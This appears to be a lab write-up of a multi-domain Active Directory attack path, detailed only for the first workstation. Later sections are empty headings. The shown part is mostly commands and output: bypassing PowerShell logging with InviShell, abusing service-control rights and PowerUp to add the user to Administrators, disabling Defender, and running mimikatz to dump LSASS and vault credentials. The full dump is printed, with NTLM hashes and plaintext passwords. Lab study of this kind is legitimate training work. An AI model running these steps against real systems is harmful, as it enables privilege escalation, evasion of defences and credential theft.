---
layout: default
---

# Attack path 1

The attck path 1 it's composed by two diferent sections:

	- section 1
	- section 2

The full network diagram of the target servers are definied in the following section

## Complete network diagram

![ Attack_path 1] (/assets/images/attack_path_1.png)

## Assets

The asstes of the GCB that should be compromise during the attack path 1 belong to three differents domains, it.gcb.local, msp.local and internal.msp.local:

	- employee15.it.gcb.local
	- it-appsrv01.it.gcb.local
	- it-sqlsrv02.it.gcb.local
	- msp-sqlreport.msp.local
	- msp-srv01.msp.local
	- internal-srv06.internal.msp.local

## Walkthrou

The starting point It's the domian computer of the itemplyee15, with hostname employee15.it.gcb.local. The initial privileges on the server are medium level and the AV Microsoft defender are enable, so It's required an initial privilege scalation:

### employee15.it.gcb.local

After the initial access with itemployee15 user, it's requeried mapping an external forlder to the RDP desktop target machine using the VPN access.

The external connection could be :

```
rdesktop -r disk:tmp=/media/f0ns1/2376533c-e89e-40ac-a692-c181e0c0ade7/downloads/Tools 192.168.100.15  -u 'it\itemployee15' -p ''
```

The first program that I loaded It's invishell:

```
PS C:\Users\itemployee15> cd C:\tools
PS C:\tools> copy \\tsclient\tmp\InviShell.zip .
PS C:\tools> Expand-Archive -Path .\InviShell.zip
PS C:\tools> cd .\InviShell\
PS C:\tools\InviShell> .\InviShell\RunWithRegistryNonAdmin.bat

C:\tools\InviShell>set COR_ENABLE_PROFILING=1

C:\tools\InviShell>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\tools\InviShell>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\tools\InviShell>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\tools\InviShell>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\tools\InviShell\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\tools\InviShell>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools\InviShell>
```

Perform a privilege an enumeration for privilege escalation:

```
PS C:\tools\InviShell> copy \\tsclient\tmp\PrivescCheck.ps1 .
PS C:\tools\InviShell> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools\InviShell> Import-Module C:\tools\InviShell\PrivescCheck.ps1
PS C:\tools\InviShell> Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML

```
Detect a vulnerable SCM privileges for the current user:

```
+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| OK | None | APPS > Startup Apps                                             |
| OK | None | APPS > Modifiable Apps                                          |
| NA | Info | APPS > Non-default Apps -> 4 result(s)                          |
| NA | Info | APPS > Startup Apps (info) -> 1 result(s)                       |
| NA | Info | APPS > Running Processes -> 33 result(s)                        |
| NA | None | CONFIG > SCCM Cache Folder (info)                               |
| OK | None | CONFIG > SCCM Cache Folder                                      |
| OK | None | CONFIG > PATH Folder Permissions                                |
| OK | None | CONFIG > AlwaysInstallElevated                                  |
| OK | None | CONFIG > PrintNightmare exploit                                 |
| OK | None | CONFIG > WSUS Configuration                                     |
| NA | Info | CONFIG > Driver Co-Installers -> 1 result(s)                    |
| NA | None | CREDS > Credential Files                                        |
| OK | None | CREDS > WinLogon                                                |
| OK | None | CREDS > Unattend Files                                          |
| NA | None | CREDS > Vault Creds                                             |
| NA | Info | CREDS > PowerShell History -> 1 result(s)                       |
| OK | None | CREDS > GPP Passwords                                           |
| NA | Info | CREDS > Vault List -> 2 result(s)                               |
| OK | None | CREDS > SAM/SYSTEM/SECURITY in shadow copies                    |
| OK | None | CREDS > SAM/SYSTEM/SECURITY Files                               |
| NA | Info | HARDENING > UEFI & Secure Boot -> 2 result(s)                   |
| NA | Info | HARDENING > Credential Guard -> 1 result(s)                     |
| KO | Med. | HARDENING > LSA Protection (RunAsPPL) -> 1 result(s)            |
| NA | Info | HARDENING > LAPS -> 1 result(s)                                 |
| NA | Info | HARDENING > LSA Protection (RunAsPPL) -> 1 result(s)            |
| NA | Info | HARDENING > PowerShell Transcription -> 1 result(s)             |
| KO | Med. | HARDENING > LAPS -> 1 result(s)                                 |
| NA | Info | HARDENING > UAC Settings -> 1 result(s)                         |
| NA | Info | MISC > Machine Role -> 1 result(s)                              |
| NA | None | MISC > System Startup History                                   |
| NA | None | MISC > Last System Startup                                      |
| NA | Info | MISC > User Home Folders -> 3 result(s)                         |
| NA | Info | MISC > Endpoint Protection -> 35 result(s)                      |
| NA | Info | MISC > OS Version -> 1 result(s)                                |
| NA | Info | MISC > Local Admin Group -> 2 result(s)                         |
| NA | Info | MISC > Hijackable DLLs -> 3 result(s)                           |
| NA | Info | MISC > Filesystem Drives -> 1 result(s)                         |
| NA | Info | NETWORK > TCP Endpoints -> 25 result(s)                         |
| NA | Info | NETWORK > Interfaces -> 1 result(s)                             |
| NA | None | NETWORK > Saved Wifi Profiles                                   |
| NA | Info | NETWORK > UDP Endpoints -> 18 result(s)                         |
| OK | None | SCHEDULED TASKS > Binary Permissions                            |
| OK | None | SERVICES > Registry Permissions                                 |
| NA | Info | SERVICES > Non-default Services -> 6 result(s)                  |
| OK | None | SERVICES > Service Permissions                                  |
| NA | None | SERVICES > Unquoted Path (info)                                 |
| KO | High | SERVICES > Binary Permissions -> 2 result(s)                    |
| KO | High | SERVICES > SCM Permissions -> 1 result(s)                       |
| OK | None | SERVICES > Unquoted Path                                        |
| NA | Info | UPDATES > Last Windows Update Date -> 1 result(s)               |
| NA | Info | UPDATES > System up to date? (info) -> 21 result(s)             |
| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
| NA | Info | USER > Groups -> 13 result(s)                                   |
| NA | Info | USER > Identity -> 1 result(s)                                  |
| NA | None | USER > Restricted SIDs                                          |
| NA | None | USER > Environment Variables                                    |
| NA | Info | USER > Privileges -> 2 result(s)                                |
+----+------+-----------------------------------------------------------------+
```


Abusse of scm privileges in order to create a new service:

```
PS C:\tools\InviShell> mkdir C:\temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/18/2024  10:37 AM                temp


PS C:\tools\InviShell> echo test > C:\temp\test.txt
PS C:\tools\InviShell> cmd /c sc create VULN binPath= "C:\temp\test.txt" start= auto error= ignore
[SC] CreateService SUCCESS
```

Load the PowerUp module and exploit the service:

```
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\itemployee15>C:\tools\InviShell\InviShell\RunWithPathAsAdmin.bat

C:\Users\itemployee15>set COR_ENABLE_PROFILING=1

C:\Users\itemployee15>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\itemployee15>set COR_PROFILER_PATH=C:\tools\InviShell\InviShell\InShellProf.dll

C:\Users\itemployee15>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\itemployee15> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
PS C:\Users\itemployee15> Import-Module \\tsclient\tmp\PowerUp.ps1

```

```
Install-ServiceBinary -Name 'VULN' -Command 'net localgroup Administrators IT\itemployee15 /add'
```

Reboot the machine before the AV delete the new binary created. And wait for service execution during the logon.
From powershell
```
shutdown /r /f /t 0
```

Logon Again and validate the High Mandatory Level for the current user:

```
C:\Windows\system32>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
it\itemployee15 S-1-5-21-948911695-1962824894-4291460450-27607


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
IT\ITEmployeesUsers                        Group            S-1-5-21-948911695-1962824894-4291460450-1124 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Disable AV on the employee machine and Dump Lsass process:

```
PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $True
PS C:\Windows\system32> cd C:\tools\
PS C:\tools> copy \\tsclient\tmp\mimikatz.exe .
PS C:\tools> .\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 487177 (00000000:00076f09)
Session           : RemoteInteractive from 2
User Name         : itemployee15
Domain            : IT
Logon Server      : IT-DC
Logon Time        : 7/18/2024 12:34:54 PM
SID               : S-1-5-21-948911695-1962824894-4291460450-27607
        msv :
         [00000003] Primary
         * Username : itemployee15
         * Domain   : IT
         * NTLM     : 04a9656e95383f010ea532b17f721b58
         * SHA1     : ea53159bf4ff1f92be2606aae153b01749a7c0aa
         * DPAPI    : b0ae4be82ac0c69aee4067d9eb074383
        tspkg :
        wdigest :
         * Username : itemployee15
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : itemployee15
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 486345 (00000000:00076bc9)
Session           : RemoteInteractive from 2
User Name         : itemployee15
Domain            : IT
Logon Server      : IT-DC
Logon Time        : 7/18/2024 12:34:54 PM
SID               : S-1-5-21-948911695-1962824894-4291460450-27607
        msv :
         [00000003] Primary
         * Username : itemployee15
         * Domain   : IT
         * NTLM     : 04a9656e95383f010ea532b17f721b58
         * SHA1     : ea53159bf4ff1f92be2606aae153b01749a7c0aa
         * DPAPI    : b0ae4be82ac0c69aee4067d9eb074383
        tspkg :
        wdigest :
         * Username : itemployee15
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : itemployee15
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 424756 (00000000:00067b34)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:49 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : IT-EMPLOYEE15$
Domain            : IT
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:23 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : it-employee15$
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 29032 (00000000:00007168)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:22 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 29000 (00000000:00007148)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:22 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 27090 (00000000:000069d2)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:22 PM
SID               :
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 427016 (00000000:00068408)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:49 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 426618 (00000000:0006827a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:49 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:24 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 48463 (00000000:0000bd4f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:23 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 48391 (00000000:0000bd07)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:23 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-EMPLOYEE15$
         * Domain   : it.gcb.local
         * Password : xls0taG6Yibm</aI6^O%oGN&\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g>>\Xz[6vP)zkvU'q3B^:N]&&<$*[>-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&z=
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : IT-EMPLOYEE15$
Domain            : IT
Logon Server      : (null)
Logon Time        : 7/18/2024 12:34:22 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : IT-EMPLOYEE15$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : it-employee15$
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\itemployee15\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (2)
          0.    Internet Explorer
                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
                LastWritten     : 4/29/2024 4:11:22 AM
                Flags           : 00000400
                Ressource       : [STRING] http://192.168.4.111/
                Identity        : [STRING] root
                Authenticator   :
                PackageSid      :
                *Authenticator* : [STRING] BugTrackerL0g1n
          1.    Internet Explorer
                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
                LastWritten     : 4/29/2024 4:11:34 AM
                Flags           : 00000400
                Ressource       : [STRING] http://192.168.4.111/
                Identity        : [STRING] itemployees
                Authenticator   :
                PackageSid      :
                *Authenticator* : [STRING] ReadOnlyAccess

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Users\itemployee15\AppData\Local\Microsoft\Vault
        Items (0)

mimikatz(commandline) # vault::cred /patch

mimikatz(commandline) # exit
Bye!

``` 

### it-appsrv01.it.gcb.local

Enumerate doamin and find an explicit group that could be added to ITemployee15
```
```
Detect LAPS privileges on domain Extract Local administrator credentials
```
```
And Access to the target machine:
```
```

### it-sqlsrv02.it.gcb.local

### msp-sqlreport.msp.local

### msp-srv01.msp.local

### internal-srv06.internal.msp.local
	





